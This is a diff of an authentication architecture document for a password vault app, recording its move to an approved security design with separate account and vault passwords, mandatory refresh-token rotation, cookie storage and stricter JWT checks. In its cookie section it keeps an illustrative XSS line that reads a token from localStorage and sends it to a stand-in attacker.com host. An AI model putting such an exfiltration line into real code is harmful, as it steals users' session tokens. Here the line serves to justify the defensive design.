@@ -1,8 +1,8 @@
 # Authentication Architecture (Target)
 
 **Date:** September 2026  
-**Gate:** G2 - Architecture Review  
-**Status:** REQUIRES SECURITY REVIEW BEFORE G3  
+**Gate:** G3 - Security/Crypto Architecture
+**Status:** APPROVED WITH CONDITIONS; implementation remains pending G5
 **Focus:** Session Management, Token Security, Account Lifecycle
 
 ---
@@ -83,13 +83,14 @@ export async function register(
     throw new AppError("Email already registered", 409, "EMAIL_EXISTS");
   }
 
-  // 3. Hash password
-  const masterPasswordHash = await bcrypt.hash(masterPassword, 10);
+  // 3. Verify/store the account authentication password only.
+  // The vault master password is a separate browser-only secret.
+  const accountPasswordVerifier = await createAccountPasswordVerifier(accountPassword);
 
   // 4. Create user
   const user = await userRepository.create({
     email,
-    masterPasswordHash,
+    accountPasswordVerifier,
     fullName,
     emailVerified: false, // Phase 2: Email verification
   });
@@ -378,7 +379,7 @@ BROWSER                        SERVER
    │  1. Verify refresh token    │
    │  2. Check token not revoked │
    │  3. Generate new access     │
-   │  4. Optionally rotate       │
+   │  4. Rotate refresh token     │
    │  5. Update session          │
    │<──200 { accessToken }───────│
    │                              │
@@ -417,8 +418,8 @@ export async function refreshAccessToken(
     process.env.JWT_SECRET!,
   );
 
-  // 4. Optional: Rotate refresh token (every N days)
-  // For now: keep same refresh token
+  // 4. Rotation is mandatory. Atomically consume the presented token,
+  // create its replacement, and revoke the token family on reuse.
 
   return { accessToken: newAccessToken };
 }
@@ -426,7 +427,7 @@ export async function refreshAccessToken(
 
 ---
 
-## 4. Session Revocation (Phase 3)
+## 4. Session Revocation (G3 target; implementation at G5)
 
 ### 4.1 SessionToken Model
 
@@ -566,11 +567,11 @@ export async function revokeOtherSessions(
 
 ---
 
-## 5. Cookie-Based Token Storage (Phase 3 - Recommended)
+## 5. Cookie-Based Token Storage (G3 target; implementation at G5)
 
 ### 5.1 Current vs. Recommended
 
-**Phase 1 (Current - XSS Risk):**
+**CURRENT STATE (prototype - XSS risk):**
 
 ```javascript
 // Vulnerable to XSS: JavaScript can access
@@ -582,7 +583,7 @@ const stolenToken = localStorage.getItem("vaultguard_token");
 fetch("https://attacker.com/steal?token=" + stolenToken);
 ```
 
-**Phase 3+ (Recommended - XSS Proof):**
+**TARGET STATE (G3 approved architecture):**
 
 ```javascript
 // Server sets in Set-Cookie header
@@ -776,7 +777,7 @@ export const envConfig = value;
 - [ ] CSRF protection if using cookies
 - [ ] Password reset flow implemented
 - [ ] Email verification (optional Phase 2)
-- [ ] 2FA infrastructure ready (optional Phase 3)
+- [ ] 2FA implementation follows the G3 lifecycle (implementation and verification at G5/G6)
 
 ### 8.2 Testing Requirements
 
@@ -789,7 +790,7 @@ export const envConfig = value;
 
 ---
 
-## 9. 2FA Architecture (Phase 3+ Optional)
+## 9. 2FA Architecture (G3 target; implementation at G5)
 
 **TOTP-based (Time-based One-Time Password):**
 
@@ -881,4 +882,27 @@ USER                          BROWSER                        SERVER
 3. ⏳ Migration risk register and ADRs to follow
 4. ⏳ Final G2 architecture gate decision
 
-**IMPORTANT:** This document requires detailed review from security-crypto-architect before Gate G3.
+**IMPORTANT:** This document records the approved G3 target. It does not claim that the current application implements these controls.
+
+## 9. Authoritative G3 Corrections
+
+### Two-secret model
+
+VaultGuard uses separate secrets for the initial production architecture:
+
+- **Account Authentication Password:** server-verified, represented only by a strong verifier, and used for account authentication and session authorization.
+- **Vault Master Password:** browser-only, never sent to the server, used to derive the vault KEK and unwrap the VEK.
+
+The account password does not decrypt the vault. Ordinary account-password recovery does not recover the Vault Master Password. No recovery mechanism is implied by this document.
+
+Account verification and vault KEK derivation are separate Argon2id contexts with separate salts, parameter records, purposes, output handling, and versioning. An account verifier must never be reused as a KEK.
+
+### Session requirements
+
+The target uses Secure, HttpOnly, SameSite-configured cookies and server-tracked refresh sessions. Refresh tokens are hashed at rest, rotated on every successful refresh, and grouped into token families. Reuse of a replaced token revokes its family. Logout revokes the current session; password change revokes all sessions.
+
+JWT verification must explicitly restrict algorithm, issuer, audience, token type, subject, and expiry. Missing production secrets fail closed.
+
+### Gate ownership
+
+G3 approves this architecture. G4 owns database architecture and JSON-to-Mongo migration planning. G5 owns implementation. G6 owns QA, G7 owns independent security audit, G8 owns visual regression, G9 owns code review, and G10 owns release readiness.
